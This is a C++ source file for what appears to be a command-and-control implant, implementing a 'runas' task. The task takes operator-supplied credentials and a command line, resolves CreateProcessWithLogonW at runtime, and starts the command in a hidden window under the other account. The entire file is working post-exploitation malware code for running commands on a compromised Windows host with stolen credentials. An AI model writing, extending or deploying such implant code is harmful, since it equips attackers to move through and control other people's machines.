#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_RUNAS

using namespace stardust;
using namespace starburst;

typedef BOOL (WINAPI *fn_CreateProcessWithLogonW)(
    LPCWSTR lpUsername,
    LPCWSTR lpDomain,
    LPCWSTR lpPassword,
    DWORD   dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR  lpCommandLine,
    DWORD   dwCreationFlags,
    LPVOID  lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

auto declfn starburst::cmd_runas(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t domain_len = 0;
    auto domain_str = parser_string( params, &domain_len );
    uint32_t user_len = 0;
    auto user_str = parser_string( params, &user_len );
    uint32_t pass_len = 0;
    auto pass_str = parser_string( params, &pass_len );
    uint32_t cmd_len = 0;
    auto cmd_str = parser_string( params, &cmd_len );

    if ( !user_str || user_len == 0 || !pass_str || pass_len == 0 ||
         !cmd_str  || cmd_len  == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need username, password, and command" ) ) );
        return;
    }

    // Copy parsed strings to stack buffers
    char domain_buf[256] = { 0 };
    if ( domain_str && domain_len > 0 )
        memory::copy( domain_buf, domain_str, domain_len < 255 ? domain_len : 255 );

    char user_buf[256] = { 0 };
    memory::copy( user_buf, user_str, user_len < 255 ? user_len : 255 );

    char pass_buf[256] = { 0 };
    memory::copy( pass_buf, pass_str, pass_len < 255 ? pass_len : 255 );

    char cmd_buf[1024] = { 0 };
    memory::copy( cmd_buf, cmd_str, cmd_len < 1023 ? cmd_len : 1023 );

    // Load advapi32.dll and resolve CreateProcessWithLogonW
    auto h_advapi32 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "advapi32.dll" ) ) );
    if ( !h_advapi32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary advapi32 failed" ) ) );
        return;
    }

    auto pCreateProcessWithLogonW = reinterpret_cast<fn_CreateProcessWithLogonW>(
        inst.kernel32.GetProcAddress( h_advapi32,
            symbol<LPCSTR>( "CreateProcessWithLogonW" ) ) );
    if ( !pCreateProcessWithLogonW ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessWithLogonW not found" ) ) );
        return;
    }

    // Convert char strings to wchar_t
    wchar_t w_domain[256] = { 0 };
    wchar_t w_user[256]   = { 0 };
    wchar_t w_pass[256]   = { 0 };
    wchar_t w_command[1024] = { 0 };

    if ( domain_buf[0] != '\0' )
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, domain_buf, -1, w_domain, 256 );

    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, user_buf, -1, w_user, 256 );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, pass_buf, -1, w_pass, 256 );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmd_buf,  -1, w_command, 1024 );

    // Set up structures
    STARTUPINFOW si;
    memory::zero( &si, sizeof( si ) );
    si.cb = sizeof( si );

    PROCESS_INFORMATION pi;
    memory::zero( &pi, sizeof( pi ) );

    BOOL ok = pCreateProcessWithLogonW(
        w_user,
        w_domain[0] != L'\0' ? w_domain : nullptr,
        w_pass,
        LOGON_WITH_PROFILE,
        nullptr,
        w_command,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if ( !ok ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessWithLogonW failed" ) ) );
        return;
    }

    // Build output: "Process created as <domain>\<username> PID: <pid>"
    char msg[512] = { 0 };
    char num[12];

    str_copy( msg, symbol<char*>( const_cast<char*>( "Process created as " ) ) );
    uint32_t off = str_len( msg );

    if ( domain_buf[0] != '\0' ) {
        uint32_t dlen = str_len( domain_buf );
        memory::copy( msg + off, domain_buf, dlen );
        off += dlen;
        msg[off++] = '\\';
    }

    uint32_t ulen = str_len( user_buf );
    memory::copy( msg + off, user_buf, ulen );
    off += ulen;

    str_copy( msg + off, symbol<char*>( const_cast<char*>( " PID: " ) ) );
    off += str_len( msg + off );

    int_to_str( num, pi.dwProcessId, 10 );
    uint32_t nlen = str_len( num );
    memory::copy( msg + off, num, nlen );
    msg[off + nlen] = '\0';

    inst.kernel32.CloseHandle( pi.hThread );
    inst.kernel32.CloseHandle( pi.hProcess );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
